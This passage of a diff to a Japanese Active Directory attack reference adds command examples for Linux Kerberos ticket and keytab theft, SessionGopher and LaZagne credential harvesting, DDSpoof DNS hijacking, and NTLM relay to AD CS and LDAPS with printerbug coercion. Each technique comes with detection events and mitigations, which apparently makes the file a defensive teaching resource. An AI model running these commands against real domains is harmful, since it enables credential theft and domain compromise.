-k、Windows側ではRubeus/Mimikatz ptt でSMB/MSSQL/HTTPへPass-the-Ticket認証する。MITREマッピングの要点: ccache/SSSD部分はT1558.005(Ccache Files)が/tmpのccacheとsecrets.ldb/.secrets.mkey抽出を明示的に扱う一方、同サブ技法の範囲はccacheでありkeytabは対象外(MITRE T1558.005はkeytabに言及しない)。keytabは非対称の秘密鍵ではなく対称鍵ファイルのため、T1552.004(Private Keys)ではなくT1552.001(Credentials In Files)が妥当、注入・再利用はT1550.003(Pass the Ticket)。rootのLinuxメンバ/踏み台1台で再利用可能なTGT(ccache)＋恒久的な鍵材料(keytab)が同時に得られる点が本技法固有の価値で、SOCがほぼ計装しないLinux起点のフォレストピボットを成立させる。",
     "tools": "linikatz, SSSDKCMExtractor, impacket (ticketConverter.py / getTGT.py / secretsdump.py -k -no-pass / psexec.py -k), MIT/Heimdal kinit・klist, sssd-kcm, NetExec/CrackMapExec (-k), Rubeus・Mimikatz(Windows側でのPtT注入)",
+    "cmd": [
+      {
+        "tool": "linikatz",
+        "t": "SSSD/FreeIPA/Samba/Centrify横断でccache・keytab・secrets.ldbを自動収集。root権限でのシェルスクリプト実行が唯一の痕跡",
+        "q": "./linikatz.sh"
+      },
+      {
+        "tool": "kinit",
+        "t": "keytabは失効しない対称鍵のため何度でも新鮮なTGTを発行できる。auditdでの`kinit`実行と`-kt`引数が観測点",
+        "q": "kinit -kt /etc/krb5.keytab HOST$@CORP.LOCAL"
+      },
+      {
+        "tool": "SSSDKCMExtractor",
+        "t": "SSSD KCMの秘密ストアをマスターキーで復号しキャッシュ済みTGTを抽出。secrets.ldbと.secrets.mkeyの両方読み取りがauditdに残る",
+        "q": "python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey"
+      },
+      {
+        "tool": "Impacket",
+        "t": "窃取したccacheをWindows形式(kirbi)へ相互変換。Pass-the-Ticket前の準備段階でこれ単体では見逃されやすい",
+        "q": "ticketConverter.py svc.ccache svc.kirbi"
+      },
+      {
+        "tool": "Impacket",
+        "t": "KRB5CCNAME経由でccacheを注入しパスワード無しでNTDS相当を取得。DC側では接続元IPがLinuxホストである点が唯一の異常",
+        "q": "secretsdump.py -k -no-pass -just-dc corp.local/administrator@dc01.corp.local"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`--use-kcache`でKRB5CCNAMEのチケットをそのまま利用しSMB認証。ハッシュもパスワードも渡さないためNTLM系検知に掛からない",
+        "q": "netexec smb dc01.corp.local --use-kcache"
+      }
+    ],
     "detect": "Linux側テレメトリが核心: auditdでwatch -w /etc/krb5.keytab と /var/lib/sss/ を張り、SSSDデーモン(sssd_be/sssd_kcm/krb5_child)以外のプロセスによるkeytab/secrets.ldb読取や/tmp/krb5cc_*のコピー、kinit -kt / klist -k / linikatz実行を検知する。オンボード済みならMDE for Linux/Falcon LinuxセンサのプロセスイベントでこれらCLIを拾う。下流(AD側)はDCのKerberos監査で相関する: 窃取ccacheの注入は最初の利用で4769(TGS要求)を、keytab由来のkinit -ktは4768(AS-REQ)を、当該principalの通常端末とは異なる送信元IP(Linuxメンバ/踏み台のIP)から発生させる。HOST$(マシンアカウント)や統合サービスアカウントが普段使わないファイル共有(cifs)/MSSQL/HTTPのサービスチケットを要求し、続けて4624 Type3/5140(SMB)/MSSQLログオンがLinuxホスト起点で連鎖する点を監視する。RC4(TicketEncryptionType 0x17)へのダウングレードも補助シグナル。なお4769のServiceNameは要求先サービスの「アカウント名/コンピュータ名」(例 FILESRV$)であり、SPNクラス文字列(cifs/http等)そのものは格納されない点に注意。",
     "events": "Linux: auditd SYSCALL/PATH (watch /etc/krb5.keytab, /var/lib/sss/secrets, /tmp/krb5cc_*), SSSD/KCMログ, MDE for Linux DeviceProcessEvents/DeviceFileEvents(オンボード時); DC/AD側(下流): 4768(AS-REQ; kinit -kt由来), 4769(TGS; 窃取ccache注入), 4624(Type3), 4672, 5140/5145(SMB共有), MSSQLログオン監査",
     "mitigate": "FILE型ccacheの世界読取を避け、krb5.confでdefault_ccache_name = KEYRING:persistent:%{uid} またはKCMを用いプロセス/セッション分離する。/etc/krb5.keytabは0600 root所有に制限し、ホスト/サービスアカウントのパスワードローテーション(adcli/realmd/自動マシンPW更新)でkvnoを更新して旧keytabを無効化、高権限アカウントのkeytab常駐を避ける。auditdでkeytab/SSSD秘密ストア(secrets.ldb/.secrets.mkey)の参照を監査し、rootアクセスと踏み台Linuxのセグメント分離・最小権限を徹底する。AD側では機微アカウントをProtected Users(委任不可/AES強制)に配置し、RC4無効化・TGT寿命短縮・Linuxホスト起点Kerberosの監視を運用する。",
@@ -10302,6 +16785,33 @@ AD.I18N.ja.attacks = [
     "summary": "管理端末や踏み台に常駐するサードパーティ製リモートアクセスクライアント(PuTTY/WinSCP/FileZilla/SuperPuTTY/mRemoteNG/RDP/VNC)が保存する接続資格情報を回収する技法。署名機序はHKEY_USERS配下の各プロファイルハイブを横断走査してセッションキーから平文/可逆暗号化されたパスワードや秘密鍵パスを取り出す点(T1552.002)にあり、加えてディスク上の.ppk/.rdp/.sdtidや設定XML(T1552.001)も回収する。ネットワーク機器・DB・他DC等の高価値ホストへ即使える横展開燃料になりやすく、安価かつ高収率。Winlogon/unattendの平文資格情報エントリ(Registry Autologon)とは別に、リモートアクセスクライアントのセッションストアに焦点を当てる。",
     "how": "前提: 対象ユーザコンテキスト、ローカル管理者、またはWMI経由のリモート管理権限。SessionGopher(PowerShell)はローカルまたはWMI(root\\default:StdRegProv)経由でHKEY_USERSに読み込まれた全プロファイルハイブを列挙し、`HKU\\<SID>\\Software\\SimonTatham\\PuTTY\\Sessions`(ホスト名・ユーザ名・プロキシパスワード・鍵ファイルパス)、`HKU\\<SID>\\Software\\Martin Prikryl\\WinSCP 2\\Sessions`(マスターパスワード未設定時はビット演算による可逆難読化のみのPassword)、`HKU\\<SID>\\Software\\Microsoft\\Terminal Server Client\\Servers`(RDP接続履歴・UsernameHint)を照会して復号する。内部処理はProcessWinSCPLocal/ProcessPuTTYLocal/ProcessRDPLocal/ProcessSuperPuTTYFile/DecryptWinSCPPassword等の関数で実装される。-Thoroughモードはドライブ全体を走査して.ppk/.rdp/.sdtid(RSA SecurID)を収集し、-AllDomainでActive Directoryの全マシンにWMIで扇状展開する(ProcessThoroughRemote/DownloadAndExtractFromRemoteRegistry)。SessionGopher自体はWinSCP/PuTTY/SuperPuTTY/FileZilla/RDPに対応するが、mRemoteNGとVNCには非対応である点に注意。mRemoteNGはconfCons.xml(カスタム暗号化パスワード未設定時はハードコードされた既定パスフレーズ`mR3m`で復号可能なT1552.001のオンディスクファイル。~v1.74はMD5派生鍵+AES-CBC、v1.75以降はPBKDF2-SHA1 1000回+AES-GCM)を、VNC(RealVNC/TightVNC/UltraVNC)はレジストリ内の固定DES鍵で暗号化されたパスワードを、いずれもLaZagneや専用デコーダで回収する(SessionGopherの機能ではない)。FileZillaは%APPDATA%\\FileZilla\\sitemanager.xml/recentservers.xmlにBase64平文でパスワードを保持する(オンディスクXML=T1552.001)。LaZagneは`lazagne.exe all`(またはsysadminカテゴリ)でwinscp/filezilla/puttycm(PuTTY Connection Manager)/mremoteng/vnc/rdpmanager等のモジュールを一括実行して抽出し、SharpWeb/Seatbeltは同種のPuTTY/WinSCP/RDPセッションキーとWindows資格情報ファイルを列挙する。回収した平文/鍵はそのまま対象ホストへの横展開に転用される。",
     "tools": "SessionGopher (Invoke-SessionGopher -Thorough / -AllDomain), LaZagne (lazagne all / sysadmin: winscp,filezilla,puttycm,mremoteng,vnc,rdpmanager), Seatbelt (PuttySessions/PuttyHostKeys/RDPSavedConnections), SharpWeb, WinSCP/mRemoteNG 専用パスワードデコーダ",
+    "cmd": [
+      {
+        "tool": "SessionGopher",
+        "t": "全プロファイルのHKUハイブとディスク全体を横断しPuTTY/WinSCP/RDP保存資格情報を回収。`-Thorough`は大量ファイル読取を伴う",
+        "q": "Invoke-SessionGopher -Thorough"
+      },
+      {
+        "tool": "SessionGopher",
+        "t": "WMI経由でドメイン全マシンへ扇状展開。単一アカウントの短時間StdRegProv呼び出しが相関の決め手",
+        "q": "Invoke-SessionGopher -AllDomain -u domain.com\\adm-user -p 's3cr3tP@ss'"
+      },
+      {
+        "tool": "LaZagne",
+        "t": "sysadminカテゴリでWinSCP/FileZilla/mRemoteNG/VNC等を一括抽出",
+        "q": "lazagne.exe sysadmin"
+      },
+      {
+        "tool": "Seatbelt",
+        "t": "PuTTYセッション/ホスト鍵とRDP保存接続を単体チェック。チェック名がそのままコマンドライン引数に残る",
+        "q": "Seatbelt.exe PuttySessions PuttyHostKeys RDPSavedConnections"
+      },
+      {
+        "tool": "cmd.exe",
+        "t": "FileZillaはBase64平文のみでツール不要。この特定パスへの`type`/`findstr`自体が強い指標",
+        "q": "type C:\\Users\\svc_user\\AppData\\Roaming\\FileZilla\\recentservers.xml"
+      }
+    ],
     "detect": "セッションレジストリキーの読み取りはSysmon EID12/13や標準監査では捕捉しにくい(SACL未設定時)ため、検知はプロセス実行・PowerShellスクリプトブロック・WMIリモートアクセス・ディスク走査に依存する。4688/Sysmon EID1でSessionGopher.ps1・lazagne.exe・Seatbeltの実行、4103/4104でInvoke-SessionGopher本体およびProcessWinSCPLocal/ProcessPuTTYLocal/ProcessSuperPuTTYFile/DecryptWinSCPPassword等の内部関数やセッションレジストリパス文字列(SimonTatham/Martin Prikryl/Terminal Server Client\\Servers)を捕捉、Sysmon EID11で短時間の大量.ppk/.rdp/.sdtid/sitemanager.xml/confCons.xml参照、リモートモードではWMI(135/DCOM)による他ホストへの扇状HKU照会を監視する。回収後の当該資格情報での新規横展開ログオン(4624 Type3、特にネットワーク機器/DB/DC宛)と相関させる。踏み台・管理端末(Tier0/Tier1ジャンプボックス)に監視を厚くするのが勘所。",
     "events": "4688/Sysmon 1 (SessionGopher/lazagne/Seatbelt実行), 4103・4104 (PowerShell ScriptBlock: Invoke-SessionGopher/ProcessWinSCPLocal/DecryptWinSCPPassword/SimonTatham/Martin Prikryl), Sysmon 11 (.ppk/.rdp/.sdtid/sitemanager.xml/confCons.xml の大量参照), 4663 (セッションレジストリキーへのSACL設定時のみ読取可視化), Sysmon 3/DeviceNetworkEvents・WMI 135/DCOM (リモートHKU扇状照会), 4624 Type3 (回収資格情報での横展開)",
     "mitigate": "各クライアントにパスワードを保存させない運用を徹底する(WinSCP/FileZillaはマスターパスワード必須化またはパスワード非保存、PuTTYはプロキシパスワード非保存、mRemoteNGは既定パスフレーズ`mR3m`に依存せずカスタム暗号化パスワードを設定、VNCは固定鍵格納を避ける)。RDPは「パスワードの保存を許可しない」GPOで資格情報保存を禁止し、Restricted Admin/Remote Credential Guardを使用。踏み台はPAM/セッションブローカ(CyberArk等)で資格情報をクライアント構成に置かない。秘密鍵はパスフレーズ付き.ppk/スマートカード/FIDOで保護。ローカル管理者権限を最小化し、AppLocker/WDACでlazagne/SessionGopherを遮断、PowerShell CLM+ScriptBlockログを有効化。重要なセッションレジストリキーにSACLを設定して読み取り可視性を得る。Remote Registryサービス停止とWMIアクセス制限でリモート走査を抑止。",
@@ -10347,6 +16857,33 @@ AD.I18N.ja.attacks = [
     "summary": "認証不要のLAN攻撃者が、DNS動的更新を行う正規のMicrosoft DHCPサーバへ細工したDHCP要求(Client FQDNオプション偽装)を送り、サーバにクライアントの代理としてAD統合(ADI)ゾーンのA/PTRレコードを作成・上書きさせ、名前解決(wpad/DC/任意ホスト)を乗っ取る手法。不正DHCPサーバもドメイン資格情報も不要で、DNS変更はDHCP/DNSサーバ名義になるため痕跡が残りにくい。Microsoft DHCPは全ネットワークの約40%で稼働し、そのうち約57%はDHCPがDCに同居する。同居時はENTERPRISE DOMAIN CONTROLLERS権限でADIゾーン全体(静的レコード含む)を書き換え可能で、machine-in-the-middleからNTLMコアーシオン/リレー(LDAP/AD CS)へ直結する。",
     "how": "Microsoft DHCPサーバは『DNS A/PTRレコードを常に動的更新する』『動的更新を要求しないクライアントに代わって更新する』を有効化した構成(多くの現場で実質既定)で、クライアントに代わりRFC 2136のDNS動的更新をAD統合(ADI)ゾーンへ書き込む。攻撃者はまずDHCP Discover/Offerでサーバ・ドメイン・DNSサーバ・スコープを列挙し、次にClient FQDNオプション(Option 81, RFC 4702)にwpadやDCホスト名等の任意FQDNを詰め、Requested IPオプションで指定IPをリースするDHCP Requestを送る。DHCPプロトコルには認証が無いため、同一セグメント(またはUDP 67へ到達可能)の未認証攻撃者だけで、DHCPサーバに任意AレコードをリースIP(=攻撃者制御IP)で作成・上書きさせられる。ツールddspoofはset-ip/set-cid/set-serverで対象を設定し、write-record/delete-recordでADIゾーンのレコードを書き換え、start-dhcp/start-llmnrスニファでスプーフ機会を検出する。Name Protection(DHCID/RFC 4701)は本来レコード所有者以外による上書きを防ぐが既定で無効。無効時、かつDHCPサーバに専用DNSクレデンシャルが未構成だと、DHCPサーバは自身のマシンアカウント(DCと同居時はENTERPRISE DOMAIN CONTROLLERSプリンシパルがゾーン内全レコードへ書込可)でゾーン内の任意レコード(静的レコード含む)を上書きし得る。Name Protection有効時でも回避可能で、AkamaiはDHCID値がHTYPE+クライアントID(MAC)+FQDNからSHA-256で決定的に算出でき(Windows実装ではDHCIDデータ部が定数)、全MAC空間を総当りして対象レコードのDHCIDに一致するMAC(=被害者MAC)を特定できることを示した。そのMACをClient IDに詰めたDHCP Releaseを送るとDHCPサーバが該当レコードを削除し、攻撃者が再登録できる——回避の唯一の要件は被害者のMACアドレスのみ(構築したDHCIDで直接上書きするのではなく、Releaseで削除→再登録する点が要点)。更新はDHCP/DNSサーバのマシンアカウント名義で行われるため、結果のDNS変更は攻撃者ではなくサーバに帰属し、DNS監査に攻撃者主体の痕跡が残らない点がSOCの見落としやすい核心。テレメトリ上Microsoft DHCPは全ネットワークの約40%で稼働し、そのうち約57%でDHCPがDCに同居しており、同居環境ではADIゾーン全体を書き換え可能で影響が拡大する。上書きしたwpad/ホストレコードはmachine-in-the-middleを与え、WPAD/NTLMコアーシオンと組み合わせてntlmrelayxでLDAP/AD CS(ESC8)へのNTLMリレーに直結する。前提はDNS動的更新が有効でDHCPサーバへ到達できることのみで、資格情報は不要。分類上の注意: 正式なT1557.003(DHCP Spoofing)は不正なDHCPサーバを立てる行為を指すが、DDSpoofは正規のMicrosoft DHCPサーバの動的更新挙動を悪用する点が異なり、最終的なAitMの効果は古典的なLLMNR/NBT-NSポイズニング(T1557.001)と等価である。",
     "tools": "akamai/DDSpoof (ddspoof; set-ip/set-cid/set-server/write-record/delete-record/start-dhcp/start-llmnr), Impacket ntlmrelayx.py, Responder(捕捉側), mitm6(併用比較), krbrelayx dnstool.py / Invoke-DNSUpdate(ADIDNS比較), Coercer / PetitPotam(コアーシオン連携)",
+    "cmd": [
+      {
+        "tool": "DDSpoof",
+        "t": "ツール起動、DHCP認証は不要で`--iface`指定のみがコマンドラインの数少ない痕跡",
+        "q": "ddspoof.py --iface eth0"
+      },
+      {
+        "tool": "DDSpoof",
+        "t": "コンソール内で標的Microsoft DHCPサーバを指定、以後のDNS書換えは全てこのサーバのマシンアカウント名義で記録される",
+        "q": "set-server 10.0.0.10"
+      },
+      {
+        "tool": "DDSpoof",
+        "t": "DHCP Option81経由で任意FQDNのA/PTRレコードを動的更新、`write-record`が中核コマンドでDHCPサーバログのOption81に痕跡が残る",
+        "q": "write-record wpad.corp.local 10.0.0.50"
+      },
+      {
+        "tool": "DDSpoof",
+        "t": "Name Protection有効時の回避、DHCID総当りで特定した被害者MACでReleaseを送り既存レコードを強制削除する",
+        "q": "delete-record dc01.corp.local"
+      },
+      {
+        "tool": "dhcp_coerce.py",
+        "t": "DHCP DNS書換えとコアーシオンを一括実行する付属ツール、`-c`の偽装Client-IDが固有の識別子になる",
+        "q": "dhcp_coerce.py -i eth0 -d corp.local -s 10.0.0.10 -c 10.0.0.50 -ip 10.0.0.5"
+      }
+    ],
     "detect": "DHCPサーバ監査ログ(DhcpSrvLog)のDNS動的更新イベント(30=更新要求/32=更新成功)で、wpad・DC・重要サーバのFQDNが短時間に登録/上書きされる、単一の要求元から多数の異なるクライアントID/FQDNが連続する、Name Protection回避を狙うDHCP Release(12=リース解放)が重要名に対して発行される、といった異常を検知する。DNS側のMicrosoft-Windows-DNS-Server/Audit 515/516(レコード作成/削除)およびSecurity 5136(dnsNodeオブジェクト変更)はアクターがDHCP/DNS(DC)のマシンアカウントになるため、『重要名のレコード値(IP)が攻撃者/未知IPへ変化した』点で判断する(ADIDNS Spoofingのような一般ユーザ主体の判定は通用しない)。ネットワークでは単一ホストからのDHCP Request/Release(UDP 67)バーストとClient FQDNオプションの異常を監視する。",
     "events": "DHCPサーバ監査 DhcpSrvLog-*.log 30(DNS update request)/31(DNS update failed)/32(DNS update successful)・10/11(リース付与/更新)・12(リース解放=Name Protection回避のDHCP Release), Microsoft-Windows-Dhcp-Server/Operational・/Admin, DNS Server監査 Microsoft-Windows-DNS-Server/Audit 515(レコード作成)/516(レコード削除), Security 5136(dnsNodeオブジェクト変更; アクター=DHCP/DNS(DC)マシンアカウント), 4624 Type3(下流のNTLMリレー着地), 4886/4887(AD CS証明書要求/発行)",
     "mitigate": "不要ならDHCPの『動的更新を要求しないクライアントに代わって更新』を無効化する。ゾーンをSecure onlyにするだけでは不十分(DHCPサーバは認証済み更新を行うため回避される)。Microsoft推奨のDHCP DNSクレデンシャル(更新専用の最小権限アカウント)を構成し、DHCPサーバがマシンアカウント/ENTERPRISE DOMAIN CONTROLLERS権限で更新しないようにする。DnsUpdateProxyグループの使用をやめる(所有者無しの上書き可能レコードを生むため)。DHCPロールをDCから分離する。Name Protection(DHCID)を有効化する(ただしDHCP Release/DHCID総当りで回避され得るため単独では不十分)。GlobalQueryBlockList(既定でwpad/isatapを遮断)を維持し、wpad等の重要レコードは静的登録+ADIゾーンACLで保護する。DHCPサーバのUDP 67到達範囲をセグメントで制限する。下流のNTLMリレー対策としてLDAP署名+チャネルバインディング(EPA)必須化、AD CS Webエンロールの保護、SMB署名必須化を実施する。",
@@ -10392,6 +16929,28 @@ AD.I18N.ja.attacks = [
     "summary": "Windowsのリモートレジストリ クライアント(RegConnectRegistry系API/winreg RPC、内部はadvapi32!BaseBindToMachine)がSMB(名前付きパイプ)到達不可時にncacn_ip_tcpへフォールバックし、安全なSMB経路のRPC_C_AUTHN_LEVEL_PKT_PRIVACYから署名/整合性なしのRPC_C_AUTHN_LEVEL_CONNECTへ認証レベルが劣化する欠陥。攻撃者はSMB(445)を塞いでこのTCPフォールバックを強制し、コーサーした「リモートサーバ」ではなくリモートレジストリ クライアント自身のマシン/ユーザNTLMを捕捉、署名未強制のAD CS(ESC8)やLDAPへリレーする。既知のCoercionパイプ(EFSRPC/DFSNM/PetitPotam等)が塞がれても機能する新しいリレー起点であり、DA証明書やRBCD/Shadow Credentialsへ到達しうる。厳密にはサーバ側強制認証ではなくクライアント側のRPC認証ダウングレード(AiTM)だが、リレー系エントリと同じ扱いでここに整理する。",
     "how": "リモートレジストリのクライアントAPI RegConnectRegistryW/RegConnectRegistryExW(内部はadvapi32!BaseBindToMachine経由でwinreg/MS-RRP RPC、interface UUID 338CD001-2244-31F1-AAAA-900038001003)は、まず\\\\\\\\pipe\\\\\\\\winreg(ncacn_np, 445/SMB)へRPC_C_AUTHN_LEVEL_PKT_PRIVACYで接続を試み、失敗するとncacn_ip_tcp(EPM 135経由で動的高ポート)等へフォールバックする。このTCP経路で用いる認証がRPC_C_AUTHN_LEVEL_CONNECT(接続時のみ認証=パケット整合性/署名/暗号化なし)へ劣化する点が本CVEの本質で、確立したNTLM認証をそのまま第三のサービスへ中継(リレー)できてしまう。攻撃者は高権限のマシンアカウントや管理者がリモートレジストリ接続を開始する状況を作り、クライアントと対象の通信経路上のAiTM位置からSMB(445)を到達不能にして(セグメント遮断/ファイアウォール/AiTM)TCPフォールバックを強制する。接続先にホスト名でなくIPアドレスやSPN不一致の名前を使わせるとKerberosが失敗しNTLMへ落ちるため、攻撃者ホスト上でクライアント自身のマシン/ユーザNTLMを捕捉できる(コーサーされたリモートサーバのNTLMではなく、リモートレジストリ クライアント自身の資格情報である点が特徴)。捕捉したNTLMをntlmrelayx等で署名未強制のサービス — AD CS Web/RPC Enrollment(ESC8)やLDAP — へリレーする。AD CSへリレーできればクライアント認証EKUを持つ証明書(コーサー元がマシンならマシン証明書、管理者ユーザならユーザ証明書)を発行させ、以後PKINITでそのプリンシパルとして認証、対象がDCならDCSync、メンバーサーバならRBCDやmsDS-KeyCredentialLink(Shadow Credentials)で横展開・昇格する。成立条件はAD CS WebのEPA未設定、LDAP署名/チャネルバインディング未強制。2024年10月修正はBaseBindToMachineの既定動作を変更し、既定では危険なTCP/IPフォールバック自体を無効化(新設のレジストリポリシーTransportFallbackPolicy等で制御、既定=フォールバック不可)、名前付きパイプ+RPC_C_AUTHN_LEVEL_PKT_PRIVACYのみを許可することで本経路を封じた。",
     "tools": "Akamai PoC (CVE-2024-43532), impacket ntlmrelayx.py (--adcs/-t http/ldap), Certipy (relay/ESC8), krbrelayx, Coercer/PetitPotam系(併用トリガ), reg.exe・RegConnectRegistry(正規クライアント)",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "標的への正規リモートレジストリ接続、SMB(445)遮断時にRPCがTCPフォールバックし認証レベルが劣化する起点、reg.exe自体は正規運用と同一",
+        "q": "reg.exe query \\\\dc01.corp.local\\HKLM"
+      },
+      {
+        "tool": "Akamai PoC",
+        "t": "中継サーバ側PoC、RELAY_TARGET等はソースにハードコードされ引数を取らないため起動コマンド単体では検知できない",
+        "q": "python3 winreg_relay_adcs.py"
+      },
+      {
+        "tool": "Impacket",
+        "t": "捕捉したリモートレジストリ クライアントのNTLMをESC8へ中継し証明書を発行、宛先がAD CS Web登録である点が着地点",
+        "q": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "発行されたマシン証明書でPKINIT認証、TGTとNTLMハッシュを取得して以後の横展開へ連鎖する",
+        "q": "Rubeus.exe asktgt /user:dc01$ /certificate:cert.pfx /password:'Passw0rd!' /getcredentials /nowrap"
+      }
+    ],
     "detect": "リレー先のAD CS/DC側で、マシンアカウント(末尾$)がNTLMでLogon Type 3認証(4624, Authentication Package=NTLM)している送信元IPが、当該マシン本来のIPと異なる=リレーの兆候。CA上の証明書発行(4886/4887)で、クライアント認証EKUを持つ証明書がマシンアカウント(特にDC$や高権限機)へ、通常のオートエンロールでなくWeb Enrollment経由・想定外の要求元から発行されていないかを監視する。エンドポイントでは445失敗直後に135(EPM)経由でwinreg RPCが動的ポートへTCP接続する非定型パターン、およびリレーホストからCAの/certsrv(80/443)へ非ブラウザプロセスがアクセスする痕跡を相関する。M365 Defender for IdentityのNTLMリレー/ESC8検知も併用する。",
     "events": "4624(Logon Type 3, Authentication Package=NTLM／リレー先でのマシンアカウント認証), 4625, 4886/4887(AD CS 証明書要求受領/発行), 5145(\\\\\\\\pipe\\\\\\\\winreg 詳細ファイル共有アクセス※SMB経路が使えた場合のみ・TCPフォールバック時は不在), 4768/4769(証明書取得後のPKINIT/Kerberos), 4672・4662(取得後のDCSync GUID 1131f6aa/1131f6ad), Sysmon EID3(135/動的RPCポートへのTCP接続), M365 Defender IdentityLogonEvents(Protocol=Ntlm)",
     "mitigate": "2024年10月の月例パッチ(CVE-2024-43532)を適用する。修正後の既定ではBaseBindToMachineの危険なTCP/IPフォールバックが無効化され(TransportFallbackPolicy等のレジストリポリシーで制御)、リモートレジストリは名前付きパイプ+RPC_C_AUTHN_LEVEL_PKT_PRIVACYのみで接続する(未適用環境では0patch等のマイクロパッチでフォールバック無効化も可)。AD CS Web Enrollment(certsrv/CES/NDES)でEPA(Extended Protection for Authentication)を必須化し、HTTP登録を無効化してHTTPS+チャネルバインディングを強制する。DCでLDAP署名およびLDAPチャネルバインディングを強制し、SMB署名を全面有効化する。不要な端末ではRemote Registryサービスを停止/無効化、AD CS登録テンプレートとenroll権限を最小化し、可能ならRestrict NTLMでNTLM利用を制限する。",
@@ -10437,6 +16996,33 @@ AD.I18N.ja.attacks = [
     "summary": "NTLM AUTHENTICATE_MESSAGE を二段で改変する Drop-the-MIC 系の中継手法。(1) MICと同時に MsvAvFlags の『MIC在中』ビット(0x2)も落とす『部分MIC除去』でCVE-2019-1040修正後のMIC必須検知を回避し、(2) NTLMSSPの SIGN/SEAL ネゴシエートフラグを落として NTLMSSP_NEGOTIATE_LOCAL_CALL を温存することで、DCがバインドを署名/チャネルバインディング検証をトリガしない正当なローカル相当セッションとして受理する。結果、LDAP署名およびチャネルバインディングを強制済み(Windows Server 2025既定)のLDAP/LDAPS・署名必須SMBに対してもリレーが成立する点が本質。強制認証(PrinterBug/PetitPotam等)で引き出した低権限またはDC自身のマシン認証を防御有効なDCのLDAPへ中継し、RBCD(msDS-AllowedToActOnBehalfOfOtherIdentity)/Shadow Credentials(msDS-KeyCredentialLink)書込やドメインルートへのDCSync権限付与でDC上のSYSTEM相当へ昇格する。2025-09-09の修正まで、署名/CB強制という『リレー対策の定番』そのものを無効化した。",
     "how": "前提: coercion可能なRPCインターフェース(MS-RPRN/MS-EFSRPC/MS-DFSNM等)へ到達、CVE-2025-54918未修正(2025-09-09より前)のDC、LDAP書込に足るコンテキスト。従来のリレーはLDAP署名/チャネルバインディング(EPA)が『未強制』であることが成立条件だったが、本手法はその強制を回避する点が新しい。(1) 部分MIC除去対応フォーク(impacket-partial-mic)の ntlmrelayx を ldaps://DC 宛で待受(--remove-mic-partial に加え --escalate-user / --delegate-access / --shadow-credentials)。(2) PrinterBug(MS-RPRN SpoolSample)やPetitPotam/Coercerで対象マシンアカウント(またはDC$)のNTLM認証を攻撃者へ強制。(3) 中継時にNTLM AUTHENTICATE_MESSAGE を二段で改変する——(a) MICを除去し、同時に MsvAvFlags の『MIC在中』ビット(0x2)も落とす『部分MIC除去』でCVE-2019-1040修正後のMIC必須検知を回避、(b) NTLMSSPネゴシエートフラグの NTLMSSP_NEGOTIATE_SIGN / _SEAL を落として NTLMSSP_NEGOTIATE_LOCAL_CALL を温存する。これによりDCはバインドを『署名/CB検証をトリガしない正当なローカル相当セッション』として受理し、署名・チャネルバインディング強制済み(Windows Server 2025既定)のLDAP/LDAPSでも中継が成立する。旧Drop-the-MIC(CVE-2019-1040系)は単にMICを落とすだけで、その後の修正で MsvAvFlags による MIC必須検知が入り塞がれたが、本手法は MsvAvFlags のビット改変とネゴシエートフラグ操作を併用してその検知を回避する点が新しい。(4) 受理されたLDAP(S)書込で、攻撃者制御コンピュータへのRBCD設定(msDS-AllowedToActOnBehalfOfOtherIdentity)、対象のmsDS-KeyCredentialLink書込(Shadow Credentials)、またはドメインオブジェクトのnTSecurityDescriptorへDCSync権限付与(--escalate-user)を実施。(5) RBCD/Shadow Credsなら getST.py/Rubeus で S4U2Self/PKINIT チケットを取得しDCへCIFS/LDAP(DCSync)アクセス、権限付与ならそのままDCSyncでSYSTEM相当へ。DC自身をcoerceして中継すればDC直接侵害に至る。修正(2025-09-09, CVSS 8.8)後は改変済みAUTHENTICATEが拒否されるため、パッチが唯一の確実な遮断策となる。",
     "tools": "impacket 部分MIC除去フォーク impacket-partial-mic の ntlmrelayx.py (--remove-mic-partial -smb2support -t ldaps://DC と --escalate-user / --delegate-access / --shadow-credentials), PetitPotam.py, printerbug.py (MS-RPRN SpoolSample), dfscoerce.py, Coercer, addcomputer.py, getST.py / Rubeus (Shadow Credentials→PKINIT / RBCD→S4U)",
+    "cmd": [
+      {
+        "tool": "ntlmrelayx",
+        "t": "decoder-it/impacket-partial-micフォーク、MICとMsvAvFlagsのMICビットを同時除去しLDAPS署名/CB強制を回避、`--remove-mic-partial`が固有トークン",
+        "q": "ntlmrelayx.py --remove-mic-partial -t ldaps://dc01.corp.local -smb2support --delegate-access"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "同フォークでShadow Credentials(msDS-KeyCredentialLink)を書込み、`--shadow-credentials`が識別子",
+        "q": "ntlmrelayx.py --remove-mic-partial -t ldaps://dc01.corp.local -smb2support --shadow-credentials"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "ドメインオブジェクトへDCSync権限を付与する版、`--escalate-user`で対象アカウントを指定する",
+        "q": "ntlmrelayx.py --remove-mic-partial -t ldaps://dc01.corp.local -smb2support --escalate-user svc_user"
+      },
+      {
+        "tool": "printerbug.py",
+        "t": "MS-RPRNで標的(DC自身も可)から攻撃者リレーへNTLM認証を強制する起点コマンド",
+        "q": "python3 printerbug.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local 10.0.0.5"
+      },
+      {
+        "tool": "Impacket",
+        "t": "RBCD成立後にS4U2Self/S4U2Proxyでサービスチケットを取得しDCSyncへ悪用、`-impersonate`が痕跡",
+        "q": "getST.py -spn cifs/dc01.corp.local -impersonate administrator 'corp.local/FAKE$:Passw0rd!'"
+      }
+    ],
